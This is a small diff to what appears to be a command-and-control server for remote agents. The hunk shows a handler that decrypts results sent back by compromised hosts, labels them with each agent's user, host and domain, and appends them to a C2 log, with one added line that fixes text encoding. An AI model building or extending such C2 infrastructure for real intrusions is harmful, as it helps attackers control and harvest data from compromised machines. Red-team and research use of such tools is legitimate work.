@@ -319,6 +319,7 @@ def result():
     if AGENTS.get(id) != None and data != None:
         #data = data.decode('base64')
         data = decrypt(AESKey,data)
+        data=data.encode('ascii','ignore')
         p_out = '[+] Agent (%d) - %s@%s\\%s send Result' % (AGENTS[id][0], AGENTS[id][7],AGENTS[id][6],AGENTS[id][5])
         history=file("c2-logs.txt","a")
         history.write(p_out+"\n")
